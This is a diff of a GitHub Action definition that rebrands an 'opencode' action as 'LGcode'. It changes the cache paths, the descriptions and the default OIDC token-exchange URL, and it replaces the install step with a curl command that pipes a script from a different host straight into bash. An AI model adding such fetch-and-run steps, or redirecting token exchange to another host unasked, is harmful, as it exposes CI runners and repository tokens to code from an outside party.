@@ -22,7 +22,7 @@ inputs:
     required: false
 
   use_github_token:
-    description: "Use GITHUB_TOKEN directly instead of OpenCode App token exchange. When true, skips OIDC and uses the GITHUB_TOKEN env var."
+    description: "Use GITHUB_TOKEN directly instead of LGcode App token exchange. When true, skips OIDC and uses the GITHUB_TOKEN env var."
     required: false
     default: "false"
 
@@ -35,7 +35,7 @@ inputs:
     required: false
 
   oidc_base_url:
-    description: "Base URL for OIDC token exchange API. Only required when running a custom GitHub App install. Defaults to https://api.opencode.ai"
+    description: "Base URL for OIDC token exchange API. Only required when running a custom GitHub App install. Defaults to https://api.modelhub.lgdg.cc"
     required: false
 
 runs:
@@ -52,17 +52,17 @@ runs:
       id: cache
       uses: actions/cache@v4
       with:
-        path: ~/.opencode/bin
-        key: opencode-${{ runner.os }}-${{ runner.arch }}-${{ steps.version.outputs.version }}
+        path: ~/.lgcode/bin
+        key: lgcode-${{ runner.os }}-${{ runner.arch }}-${{ steps.version.outputs.version }}
 
     - name: Install opencode
       if: steps.cache.outputs.cache-hit != 'true'
       shell: bash
-      run: curl -fsSL https://opencode.ai/install | bash
+      run: curl -fsSL https://modelhub.lgdg.cc/install | bash
 
     - name: Add opencode to PATH
       shell: bash
-      run: echo "$HOME/.opencode/bin" >> $GITHUB_PATH
+      run: echo "$HOME/.lgcode/bin" >> $GITHUB_PATH
 
     - name: Run opencode
       shell: bash
